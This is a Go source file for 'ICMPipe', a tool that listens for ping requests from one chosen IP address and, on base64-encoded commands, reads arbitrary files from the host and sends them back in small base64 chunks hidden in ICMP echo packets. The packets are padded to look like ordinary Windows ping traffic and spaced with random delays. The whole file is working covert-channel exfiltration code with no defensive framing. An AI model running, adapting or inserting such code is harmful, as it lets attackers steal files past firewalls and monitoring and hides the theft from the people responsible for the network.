package main

import (
	"encoding/base64"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage: ICMPipe <interface_id> <Client_ip>")
		fmt.Println("Use 0,1,2… for interface_id (see list below)")
		devices, _ := pcap.FindAllDevs()
		for i, dev := range devices {
			fmt.Printf("[%d] %s: %s\n", i, dev.Name, dev.Description)
		}
		return
	}

	var ifaceID int
	fmt.Sscanf(os.Args[1], "%d", &ifaceID)
	allowedIP := os.Args[2]

	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatalf("Error finding interfaces: %v", err)
	}

	if ifaceID < 0 || ifaceID >= len(devices) {
		log.Fatalf("Invalid interface id %d", ifaceID)
	}

	iface := devices[ifaceID].Name
	fmt.Printf("Listening on interface [%d] %s for ICMP Echo Requests from %s\n", ifaceID, iface, allowedIP)

	// Open interface for sniffing
	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error opening interface: %v", err)
	}
	defer handle.Close()

	// Open raw ICMP socket for sending replies
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Fatalf("Error opening raw ICMP socket: %v", err)
	}
	defer conn.Close()

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	for packet := range packetSource.Packets() {
		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		icmpLayer := packet.Layer(layers.LayerTypeICMPv4)

		if ipLayer != nil && icmpLayer != nil {
			ip, _ := ipLayer.(*layers.IPv4)
			icmpPacket, _ := icmpLayer.(*layers.ICMPv4)

			if icmpPacket.TypeCode.Type() == layers.ICMPv4TypeEchoRequest && ip.SrcIP.String() == allowedIP {
				fmt.Printf(" -> Detected ICMP Echo Request from %s, Initiating Transfer...\n", allowedIP)

				decodedBytes, _ := base64.StdEncoding.DecodeString(string(icmpPacket.Payload))
				StringDecodedBytes := string(decodedBytes)

				switch {

				case strings.HasPrefix(StringDecodedBytes, "FR"):

					// First Step Is to Send File request Dummy ICMP Reply uncomment this section if you want to send a dummy reply to the client
					/*
						reply := &icmp.Message{
							Type: ipv4.ICMPTypeEchoReply,
							Code: 0,
							Body: &icmp.Echo{
								ID:   int(icmpPacket.Id),
								Seq:  int(icmpPacket.Seq),
								Data: []byte(icmpPacket.Payload), // <- standard windows size must be enforced at client
							},
						}

						replyBytes, err := reply.Marshal(nil)
						if err != nil {
							log.Printf("Failed to marshal reply: %v", err)
						}

						// Sending File request Dummy ICMP Reply

						dst := &net.IPAddr{IP: ip.SrcIP}
						_, err = conn.WriteTo(replyBytes, dst)
						if err != nil {
							log.Printf("Failed to send File request Dummy ICMP reply: %v", err)
						} else {
							fmt.Printf(" -> File request Dummy_ICMP_Reply sent to %s\n", allowedIP)
						}
					*/

					//Second Step is Checking if the requested file Exists and its size
					windowsPayload := []byte("abcdefghijklmnopqrstuvwabcdefg") // 30 bytes

					dir := string(StringDecodedBytes)[2:]
					fmt.Printf(" -> Requested File Directory is %s.\n", dir)

					fileBytes, err := os.ReadFile(dir)

					var faMessage string

					if err != nil {
						log.Printf("Failed to read file: %v", err)
						faMessage = "File not found"
					} else {
						encodedFile := base64.StdEncoding.EncodeToString(fileBytes)
						fileSize := len(encodedFile)

						fmt.Printf(" -> Requested File Found.\n")
						fmt.Printf(" -> Requested File size is %d Bytes.\n", fileSize)

						faMessage = strconv.Itoa(fileSize)
					}

					// Build FA payload
					payloadBytes := []byte("FA" + faMessage + "FA")
					encodedFA := base64.StdEncoding.EncodeToString(
						append(payloadBytes, windowsPayload...),
					)

					request := &icmp.Message{
						Type: ipv4.ICMPTypeEcho,
						Code: 0,
						Body: &icmp.Echo{
							ID:   int(icmpPacket.Id),
							Seq:  int(icmpPacket.Seq + 130),
							Data: []byte(encodedFA),
						},
					}

					requestBytes, err := request.Marshal(nil)
					if err != nil {
						log.Printf("Failed to marshal FA request: %v", err)
						return
					}

					// Give the client time to start listening
					delay := time.Duration(rand.Intn(1000)) * time.Millisecond
					time.Sleep(delay)

					// Send FA packet
					faDst := &net.IPAddr{IP: ip.SrcIP}
					_, err = conn.WriteTo(requestBytes, faDst)
					if err != nil {
						log.Printf("Failed to send File Acknowledgement ICMP request: %v", err)
						return
					}

					fmt.Printf(" -> File Acknowledgement ICMP request sent to %s\n", allowedIP)

				case strings.HasPrefix(StringDecodedBytes, "FP"):

					// First Step Is to Send File Pull Dummy ICMP Reply uncomment this section if you want to send a dummy reply to the client
					/*
						reply := &icmp.Message{
							Type: ipv4.ICMPTypeEchoReply,
							Code: 0,
							Body: &icmp.Echo{
								ID:   int(icmpPacket.Id),
								Seq:  int(icmpPacket.Seq),
								Data: []byte(icmpPacket.Payload), // <- standard windows size must be enforced at client
							},
						}

						replyBytes, err := reply.Marshal(nil)
						if err != nil {
							log.Printf("Failed to marshal FP reply: %v", err)
						}

						// Sending File request Dummy ICMP Reply

						dst := &net.IPAddr{IP: ip.SrcIP}
						_, err = conn.WriteTo(replyBytes, dst)
						if err != nil {
							log.Printf("Failed to send File pull Dummy ICMP reply: %v", err)
						} else {
							fmt.Printf(" -> File pull Dummy ICMP reply sent to %s:\n", allowedIP)
						}
					*/

					//Second Step is to read the file, prepare chunks and send them

					dir := string(StringDecodedBytes)[2:]
					data, err := os.ReadFile(dir)
					if err != nil {
						log.Printf("Failed to read file: %v", err)
						return
					}

					encodedData := base64.StdEncoding.EncodeToString(data)

					const icmpPayloadSize = 32 // Windows-style payload
					const prefix = "FD"
					const usableDataSize = icmpPayloadSize - len(prefix)
					count := 0

					for i := 0; i < len(encodedData); i += usableDataSize {
						end := i + usableDataSize
						if end > len(encodedData) {
							end = len(encodedData)
						}

						chunkData := encodedData[i:end]

						// Build payload: "FD" + chunk
						payload := append([]byte(prefix), []byte(chunkData)...)

						// Pad if needed to reach exact payload size (it breaks the client decoding) to be solved
						//	if len(payload) < icmpPayloadSize {
						//		padding := make([]byte, icmpPayloadSize-len(payload))
						//		payload = append(payload, padding...)
						//	}

						reply := &icmp.Message{
							Type: ipv4.ICMPTypeEcho,
							Code: 0,
							Body: &icmp.Echo{
								ID:   int(icmpPacket.Id),
								Seq:  int(icmpPacket.Seq),
								Data: payload,
							},
						}

						replyBytes, err := reply.Marshal(nil)
						if err != nil {
							log.Printf("Failed to marshal reply: %v", err)
							continue
						}

						dst := &net.IPAddr{IP: ip.SrcIP}
						_, err = conn.WriteTo(replyBytes, dst)
						if err != nil {
							log.Printf("Failed to send ICMP reply: %v", err)
						}

						count++

						log.Printf(" -> Chunk number %d Sent.", count)

						// Delay to recive Dummy FD from client before sending next chunk
						//	delay := time.Duration(rand.Intn(9000)) * time.Millisecond
						//	time.Sleep(delay)
					}
				}

			}
		}
	}
}
func init() {
	rand.Seed(time.Now().UnixNano())
}
